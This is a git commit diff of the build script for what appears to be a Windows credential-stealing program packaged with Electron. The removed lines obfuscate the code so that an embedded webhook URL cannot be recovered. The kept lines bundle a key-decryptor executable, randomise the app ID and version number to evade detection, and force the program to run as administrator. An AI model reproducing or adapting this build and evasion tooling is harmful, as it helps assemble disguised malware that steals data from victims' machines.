6ba20f8bb3bbc047f376ecc784027e59cae4eec8
Yuuto <thelio.trinite@outlook.com>
2023-05-10 15:59:45 +0200

    obfuscation

--- build.js
+++ build.js
@@ -1,7 +1,6 @@
 const builder = require('electron-builder');
-const { copyFileSync, readFileSync } = require('fs');
+const { copyFileSync } = require('fs');
 const { join } = require('path');
-const { obfuscate } = require('js-confuser');
 
 // Copy decryptors to the "dist" folder
 copyFileSync(join(__dirname, 'util', 'decrypt-key', 'decrypt_key.exe'), join(__dirname, 'dist', 'decrypt_key.exe'));
@@ -19,40 +18,23 @@ function randomString(length) {
   return result;
 }
 
-// Parts of the code, like the webhook URL, can be get using websites deobfuscating the code
-// Like this website: https://deobfuscate.relative.im/
-// So we obfuscate the code once again (Webpack makes the first obfuscation)
-obfuscate(readFileSync(join('dist', 'index.bundle.js')).toString(), {
-  target: 'node',
-  renameVariables: true,
-  identifierGenerator: 'mangled',
-  minify: true,
-  compact: true,
-  stringCompression: true,
-  stringEncoding: true,
-  stringSplitting: true,
-  deadCode: true,
-  calculator: true,
-}).then(() => {
-  console.log('Finished reobfuscating the code');
-  // Build the executable
-  builder.build({
-    targets: builder.Platform.WINDOWS.createTarget(),
-    config: {
-      appId: 'com.' + randomString(16),
-      productName: require('./config').name,
-      executableName: require('./config').filename,
-      icon: './icon.ico',
-      compression: 'maximum',
-      buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
-      artifactName: require('./config').filename + '.exe',
-      win: {
-        requestedExecutionLevel: 'requireAdministrator', // Force launch as administrator
-      },
-      files: [
-        'dist/*.bundle.js',
-        'dist/*.exe'
-      ],
-    }
-  });
+// Build the executable
+builder.build({
+  targets: builder.Platform.WINDOWS.createTarget(),
+  config: {
+    appId: 'com.' + randomString(16),
+    productName: require('./config').name,
+    executableName: require('./config').filename,
+    icon: './icon.ico',
+    compression: 'maximum',
+    buildVersion: `${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)}`,
+    artifactName: require('./config').filename + '.exe',
+    win: {
+      requestedExecutionLevel: 'requireAdministrator', // Force launch as administrator
+    },
+    files: [
+      'dist/*.bundle.js',
+      'dist/*.exe'
+    ],
+  }
 });
